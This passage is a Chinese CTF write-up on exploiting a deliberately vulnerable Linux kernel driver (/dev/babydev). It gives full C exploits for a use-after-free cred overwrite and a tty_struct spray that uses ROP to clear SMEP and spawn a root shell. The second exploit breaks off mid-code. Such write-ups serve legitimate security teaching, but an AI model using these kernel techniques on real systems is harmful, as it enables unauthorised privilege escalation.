于是思路是，我们有了一个UAF，使某个进程的cred结构体被放进这个UAF的空间，然后我们能够控制这个cred结构体，通过write写入uid，万事大吉！
问题是，如何控制cred结构？别忘了，**相同大小的会被放在一块**，我们首先通过ioctl改变大小，使得和cred结构大小一样，接下来只需要在触发UAF的时候新建一个cred结构，新建的结构就很有可能被放进这个UAF的空间里，创建方法嘛，每一个进程都有，那么，新建一个进程不就好了？新建进程嘛，fork就解决了。
</code></pre><p>好了，只剩下一个问题，大小是多少？</p>
<p>方法一：查看源码。因为配置比较多，效率比较低，还容易错。</p>
<p>方法二：编译一个带符号的内核，直接查看。</p>
<p>方法就很简单了，看看exp吧。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">3.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="number">4.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="number">5.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">6.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="number">7.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="number">8.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="number">9.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="number">10.</span><span class="meta">#<span class="meta-keyword">define</span> CRED_SIZE 168</span></span><br><span class="line"><span class="number">11.</span><span class="meta">#<span class="meta-keyword">define</span> DEV_NAME <span class="meta-string">"/dev/babydev"</span></span></span><br><span class="line"><span class="number">12.</span><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="number">13.</span><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line">14.&#123;</span><br><span class="line"><span class="number">15.</span> <span class="keyword">int</span> fd1, fd2, ret;</span><br><span class="line"><span class="number">16.</span> <span class="keyword">char</span> zero_buf[<span class="number">100</span>];</span><br><span class="line"><span class="number">17.</span> <span class="built_in">memset</span>(zero_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">100</span>);</span><br><span class="line"><span class="number">18.</span> fd1 = open(DEV_NAME, O_RDWR);</span><br><span class="line"><span class="number">19.</span> fd2 = open(DEV_NAME, O_RDWR);</span><br><span class="line"><span class="number">20.</span> </span><br><span class="line"><span class="number">21.</span> ret = ioctl(fd1, <span class="number">0x10001</span>, CRED_SIZE);</span><br><span class="line"><span class="number">22.</span> </span><br><span class="line"><span class="number">23.</span> close(fd1);</span><br><span class="line"><span class="number">24.</span> </span><br><span class="line"><span class="number">25.</span> <span class="keyword">int</span> now_uid = <span class="number">1000</span>;<span class="comment">//当前uid为1000</span></span><br><span class="line"><span class="number">26.</span> <span class="keyword">int</span> pid = fork();</span><br><span class="line"><span class="number">27.</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">28.</span> &#123;</span><br><span class="line"><span class="number">29.</span> perror(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="number">30.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">31.</span> &#125;</span><br><span class="line"><span class="number">32.</span> </span><br><span class="line"><span class="number">33.</span> <span class="keyword">if</span> (!pid) </span><br><span class="line"><span class="number">34.</span> &#123;</span><br><span class="line"><span class="number">35.</span> <span class="comment">//写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了。</span></span><br><span class="line"><span class="number">36.</span> ret = write(fd2, zero_buf, <span class="number">28</span>);</span><br><span class="line"><span class="number">37.</span> now_uid = getuid();</span><br><span class="line"><span class="number">38.</span> <span class="keyword">if</span> (!now_uid) </span><br><span class="line"><span class="number">39.</span> &#123;</span><br><span class="line"><span class="number">40.</span> <span class="built_in">printf</span>(<span class="string">"get root donen"</span>);</span><br><span class="line"><span class="number">41.</span> <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了。</span></span><br><span class="line"><span class="number">42.</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="number">43.</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">44.</span> &#125;</span><br><span class="line"><span class="number">45.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">46.</span> &#123;</span><br><span class="line"><span class="number">47.</span> <span class="built_in">puts</span>(<span class="string">"failed?"</span>);</span><br><span class="line"><span class="number">48.</span> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">49.</span> &#125;</span><br><span class="line"><span class="number">50.</span> &#125;</span><br><span class="line"><span class="number">51.</span> <span class="keyword">else</span></span><br><span class="line"><span class="number">52.</span> &#123;</span><br><span class="line"><span class="number">53.</span> wait(<span class="literal">NULL</span>);</span><br><span class="line"><span class="number">54.</span> &#125;</span><br><span class="line"><span class="number">55.</span> close(fd2);</span><br><span class="line"><span class="number">56.</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">57.</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="3-题目思路2-0"><a href="#3-题目思路2-0" class="headerlink" title="3.    题目思路2.0"></a>3.    题目思路2.0</h1><pre><code>好了，第一种方法只是个开胃菜，非常简单非常粗暴，
现在让我们来看看更麻烦的方法，使用tty_struct。关于tty的知识我在这里不想做过多解释，
大家可以自行查找资料。反正tty也是一种设备，
通过&apos;/dev/ptmx&apos;可以打开这个设备，我们要做的，
就是去修改这个设备的函数指针，从而使得对这个设备的操作变为我们所能控制的，
也就是说，我们控制了内核空间的执行流，完美！那么又该干点什么呢？
由于开启了smep，我们不能直接返回用户空间然后以ring0的身份调用函数。
如果可以，那么只需要调用commit_creds(prepare_kernel_cred(NULL))就可以设置为root身份，可惜我们还有更多的工作要做。

既然问题是开启了smep，那么简单，我们反正都控制了执行流，把它关掉就好了。关掉的方法就是通过写入cr4寄存器，将smep位关掉就好了，关掉smep，我们就可以回去执行提权的函数啦。
可是光是控制一次执行流是没办法做这么多工作的，而且我们也没法执行用户空间指定的代码，方法嘛，也是我们常见的方法，ROP。
通过在内核空间进行ROP，执行内核代码，关掉smep，之后回用户空间提权，然后就可以打开shell啦。内核的ROP其实和用户空间ROP相差无几，不过还是有几个细节内容需要考虑，比如，栈在哪儿？没有栈咋ROP呢？没有栈，我们就自己造栈嘛，通过一个gadget，比如xchg eax, esp，注意这里是eax和esp，32位的，就可以做到了。原理就是由于在执行那个ioctl的时候eax正好是要执行的指令的地址，换句话说，就是gadget的地址，而eax截取了低32位，如果是整个64位，rax必然是一个内核空间的地址，可是低32位，就落到用户空间了。
于是我们mmap这个位置，xchg eax, esp，使得esp变为这个值，这样栈就落到了用户空间以内。虽然没法执行代码，但是可以获取数据啊，于是我们就从用户空间获取数据来ret，然后执行内核空间的代码。
</code></pre><p>好了，几个难点如下：</p>
<p>1)    如何获取控制流？通过UAF使得tty_struct覆盖我们释放的位置，我们可以控制tty_struct，然后改写它的操作即可。</p>
<p>2)    如何设定栈？xchg eax, esp。</p>
<p>3)    如何关掉smep？通过ROP调用内核空间的gadget写入关掉smep的新cr4值到cr4寄存器里。</p>
<p>4)    如何获取权限？在关掉smep之后，用户空间调用commit_creds(prepare_kernel_creds(0))即可，这两个函数都是位于内核空间的，可是只要我们知道他们的符号位置，就可以调用内核函数，因为回到用户空间之后，我们的特权还是ring 0的，只是内存位置回来了而已。</p>
<p>5)    如何获取shell？直接system(“/bin/sh”);</p>
<p>6)    实际问题：如何写ROP链？</p>
<p>根据之前的问题，我们需要如下的gadget：</p>
<p>1)    xchg eax, esp来设置栈，用这个gadget覆盖ioctl操作函数嘛。</p>
<p>2)    写入cr4，来关闭smep。</p>
<p>3)    swapgs，回到用户空间之前的准备。</p>
<p>4)    iretq，用来回到用户空间特权级方便打开shell。</p>
<p>5)    commit_creds</p>
<p>6)    prepare_kernel_cred</p>
<p>7)    打开shell。</p>
<p>前四个直接在刚才生成的gadget中去找就可以了，后三个中的4和5，需要内核符号，在/proc/kallsyms文件可以读取到内核所有符号的地址，所以解决了，最后一个打开shell，就是用户空间的地址，好了，解决完毕。</p>
<p>于是任务就简单了，让我们来看看exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="number">2.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="number">3.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="number">4.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="number">5.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="number">6.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="number">7.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="number">8.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="number">9.</span>  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="number">10.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="number">11.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="number">12.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="number">13.</span><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="number">14.</span></span><br><span class="line"><span class="number">15.</span><span class="meta">#<span class="meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="number">16.</span><span class="meta">#<span class="meta-keyword">define</span> SPRAY_ALLOC_TIMES 0x100</span></span><br><span class="line"><span class="number">17.</span></span><br><span class="line"><span class="number">18.</span><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"><span class="number">19.</span></span><br><span class="line"><span class="number">20.</span><span class="comment">/*</span></span><br><span class="line"><span class="comment">21.</span></span><br><span class="line"><span class="comment">22.tty_struct:</span></span><br><span class="line"><span class="comment">23. int magic; // 4</span></span><br><span class="line"><span class="comment">24. struct kref kref; // 4</span></span><br><span class="line"><span class="comment">25. struct device *dev; // 8</span></span><br><span class="line"><span class="comment">26. struct tty_driver *driver; // 8</span></span><br><span class="line"><span class="comment">27. const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</span></span><br><span class="line"><span class="comment">28. [...]</span></span><br><span class="line"><span class="comment">29.</span></span><br><span class="line"><span class="comment">30.*/</span></span><br><span class="line"><span class="number">31.</span></span><br><span class="line"><span class="number">32.</span><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line"><span class="number">33.</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">34. <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line"><span class="number">35.</span> <span class="keyword">int</span> (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="number">36.</span> <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line"><span class="number">37.</span> <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="number">38.</span> <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line"><span class="number">39.</span> <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line"><span class="number">40.</span> <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line"><span class="number">41.</span> <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line"><span class="number">42.</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line"><span class="number">43.</span> <span class="keyword">int</span> (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line"><span class="number">44.</span> <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line"><span class="number">45.</span> <span class="keyword">int</span> (*write_room)(struct tty_struct *tty);</span><br><span class="line"><span class="number">46.</span> <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="number">47.</span> <span class="keyword">int</span> (*ioctl)(struct tty_struct *tty,</span><br><span class="line"><span class="number">48.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="number">49.</span> <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line"><span class="number">50.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line"><span class="number">51.</span> <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line"><span class="number">52.</span> <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line"><span class="number">53.</span> <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line"><span class="number">54.</span> <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line"><span class="number">55.</span> <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line"><span class="number">56.</span> <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line"><span class="number">57.</span> <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line"><span class="number">58.</span> <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line"><span class="number">59.</span> <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line"><span class="number">60.</span> <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line"><span class="number">61.</span> <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="number">62.</span> <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line"><span class="number">63.</span> <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line"><span class="number">64.</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line"><span class="number">65.</span> <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line"><span class="number">66.</span> <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line"><span class="number">67.</span> <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line"><span class="number">68.</span> struct serial_icounter_struct *icount);</span><br><span class="line"><span class="number">69.</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line"><span class="number">70.</span>&#125;;</span><br><span class="line"><span class="number">71.</span></span><br><span class="line"><span class="number">72.</span><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))(*commit_creds_func)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="number">73.</span><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*prepare_kernel_cred_func)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="number">74.</span></span><br><span class="line"><span class="number">75.</span><span class="comment">/* Gadgets */</span></span><br><span class="line"><span class="number">76.</span>commit_creds_func commit_creds = (commit_creds_func) <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="number">77.</span>prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="number">78.u</span>nsigned <span class="keyword">long</span> native_write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>;</span><br><span class="line"><span class="number">79.u</span>nsigned <span class="keyword">long</span> xchgeaxesp = <span class="number">0xFFFFFFFF81007808</span>;</span><br><span class="line"><span class="number">80.u</span>nsigned <span class="keyword">long</span> poprdiret = <span class="number">0xFFFFFFFF813E7D6F</span>;</span><br><span class="line"><span class="number">81.</span><span class="comment">//unsigned long iretq = 0xFFFFFFFF8181A797;</span></span><br><span class="line"><span class="number">82.u</span>nsigned <span class="keyword">long</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="number">83.u</span>nsigned <span class="keyword">long</span> swapgs = <span class="number">0xFFFFFFFF81063694</span>;</span><br><span class="line"><span class="number">84.</span></span><br><span class="line"><span class="number">85.</span><span class="comment">/* status */</span></span><br><span class="line"><span class="number">86.u</span>nsigned <span class="keyword">long</span> user_cs, user_ss, user_eflags;</span><br><span class="line"><span class="number">87.</span><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">88.</span> <span class="keyword">asm</span>(</span><br><span class="line"><span class="number">89.</span> <span class="string">"movq %%cs, %0n"</span></span><br><span class="line"><span class="number">90.</span> <span class="string">"movq %%ss, %1n"</span></span><br><span class="line"><span class="number">91.</span> <span class="string">"pushfqn"</span></span><br><span class="line"><span class="number">92.</span> <span class="string">"popq %2n"</span></span><br><span class="line"><span class="number">93.</span> :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags)</span><br><span class="line"><span class="number">94.</span> :</span><br><span class="line"><span class="number">95.</span> : <span class="string">"memory"</span></span><br><span class="line"><span class="number">96.</span> );</span><br><span class="line"><span class="number">97.</span>&#125;</span><br><span class="line"><span class="number">98.</span></span><br><span class="line"><span class="number">99.</span><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">100.</span> <span class="comment">// char *shell_str = "/bin/sh";</span></span><br><span class="line"><span class="number">101.</span> <span class="comment">// char *args[] = &#123;shell_str, NULL&#125;;</span></span><br><span class="line"><span class="number">102.</span> <span class="comment">// execve(shell_str, args, NULL);</span></span><br><span class="line"><span class="number">103.</span> system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="number">104.</span>&#125;</span><br><span class="line"><span class="number">105.</span></span><br><span class="line"><span class="number">106.</span><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">107.</span> commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line"><span class="number">108.</span>&#125;</span><br><span class="line"><span class="number">109.</span></span><br><span class="line"><span class="number">110.</span><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">111.</span> <span class="keyword">char</span> *buf = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="number">112.</span> <span class="keyword">char</span> *fake_file_operations = (<span class="keyword">char</span>*) <span class="built_in">calloc</span>(<span class="number">0x1000</span>, <span class="number">1</span>); <span class="comment">// big enough to be file_operations</span></span><br><span class="line"><span class="number">113.</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> = (<span class="title">struct</span> <span class="title">tty_operations</span> *) <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">tty_operations</span>));</span></span><br><span class="line"><span class="number">114.</span> </span><br><span class="line"><span class="number">115.</span> save_stats();</span><br><span class="line"><span class="number">116.</span> </span><br><span class="line"><span class="number">117.</span> <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line"><span class="number">118.</span> fake_tty_operations-&gt;proc_fops = &amp;fake_file_operations;</span><br><span class="line"><span class="number">119.</span> fake_tty_operations-&gt;ioctl = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)xchgeaxesp;</span><br><span class="line"><span class="number">120.</span> </span><br><span class="line"><span class="number">121.</span> <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="number">122.</span> <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, O_RDWR);</span><br><span class="line"><span class="number">123.</span> <span class="keyword">int</span> fd;</span><br><span class="line"><span class="number">124.</span> <span class="comment">//ioctl(fd2, 0x10001, 0xa8); // the same'11 as cred struct size</span></span><br><span class="line"><span class="number">125.</span> ioctl(fd2, <span class="number">0x10001</span>, TTY_STRUCT_SIZE);</span><br><span class="line"><span class="number">126.</span> write(fd2, <span class="string">"hello world"</span>, <span class="built_in">strlen</span>(<span class="string">"hello world"</span>));</span><br><span class="line"><span class="number">127.</span> close(fd1);</span><br><span class="line"><span class="number">128.</span> fd = fd2;</span><br><span class="line"><span class="number">129.</span> </span><br><span class="line"><span class="number">130.</span> <span class="comment">// spray tty</span></span><br><span class="line"><span class="number">131.</span> <span class="built_in">puts</span>(<span class="string">"[+] Spraying buffer with tty_struct"</span>);</span><br><span class="line"><span class="number">132.</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line"><span class="number">133.</span> spray_fd[i] = open(<span class="string">"/dev/ptmx"</span>, O_RDWR | O_NOCTTY); </span><br><span class="line"><span class="number">134.</span> <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">135.</span> perror(<span class="string">"open tty"</span>);</span><br><span class="line"><span class="number">136.</span> &#125;</span><br><span class="line"><span class="number">137.</span> &#125;</span><br><span class="line"><span class="number">138.</span> </span><br><span class="line"><span class="number">139.</span> <span class="comment">// now we have a tty_struct in our buffer</span></span><br><span class="line"><span class="number">140.</span> <span class="built_in">puts</span>(<span class="string">"[+] Reading buffer content from kernel buffer"</span>);</span><br><span class="line"><span class="number">141.</span> <span class="keyword">long</span> size = read(fd, buf, <span class="number">32</span>);</span><br><span class="line"><span class="number">142.</span>  <span class="keyword">if</span> (size &lt; <span class="number">32</span>) &#123;</span><br><span class="line"><span class="number">143.</span> <span class="built_in">puts</span>(<span class="string">"[-] Reading not complete!"</span>);</span><br><span class="line"><span 